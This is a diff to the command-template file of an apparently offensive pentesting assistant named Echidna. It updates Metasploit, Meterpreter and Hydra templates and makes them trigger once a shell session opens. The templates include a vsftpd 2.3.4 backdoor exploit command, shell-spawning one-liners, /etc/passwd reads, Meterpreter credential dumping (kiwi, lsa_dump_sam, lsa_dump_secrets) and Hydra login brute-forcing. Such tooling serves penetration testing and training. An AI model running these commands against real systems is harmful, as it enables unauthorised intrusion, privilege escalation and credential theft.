@@ -58,7 +58,7 @@ group: Exploit
 
 [Echidna]
 description: exploit vsftpd 2.3.4 vulnerability with metasploit
-template: msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set rhosts {host}; exploit"
+template: msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set rhosts {host}; exploit"
 condition: ["vsftpd 2.3.4"]
 group: Exploit
 [end]
@@ -115,22 +115,35 @@ group: SMB
 [end]
 
 [Echidna]
+pattern: .*shell session \d opened
 description: spawn tty
 template: python -c 'import pty;pty.spawn("/bin/bash")'
 template: echo os.system('/bin/bash')
 template: /bin/sh -i
 template: perl -e 'exec "/bin/sh";'
 template: ruby: exec "/bin/sh"
-condition: ["^(?!.*default).*$"]
+condition: ["isInitialShellEstablished"]
 group: Privilege Escalation Command
 [end]
 
 [Echidna]
+pattern: .*shell session \d opened
 description: enumlation of vulnerability for privilege escalation with metasploit
 template: use post/multi/recon/local_exploit_suggester; set session 1; exploit;
-condition: ["^(?!.*default).*$"]
+condition: ["isInitialShellEstablished"]
 group: Privilege Escalation Command
 [end]
+
+[Echidna]
+pattern: .*shell session \d opened
+name: read data from the file which is important for privesc
+template: cat /etc/passwd | grep -v nologin
+template: cat /etc/redhat-release
+template: cat /etc/os-release
+condition: ["isInitialShellEstablished"]
+group: Privilege Escalation Command
+[end]
+
 
 [Echidna]
 description: ftp command
@@ -196,6 +209,7 @@ group: HTTP
 [end]
 
 [Echidna]
+pattern: .*shell session \d opened
 description: meterpreter shell command
 template: getsystem
 template: shell
@@ -207,7 +221,7 @@ template: load kiwi
 template: creds_all
 template: lsa_dump_sam
 template: lsa_dump_secrets
-condition: ["^(?!.*default).*$", "meterpreter"]
+condition: ["isInitialShellEstablished"]
 group: Meterpreter Command
 [end]
 
@@ -220,7 +234,6 @@ group: HTTP
 
 [Echidna]
 pattern: hydra
-pattern: sudo hydra
 description: Hydra is a parallelized login cracker which supports numerous protocols to attack.
 template: hydra {host} -l user -P $passwordfile$
 template: hydra {host} -l user -P $passwordfile$ {port.name}
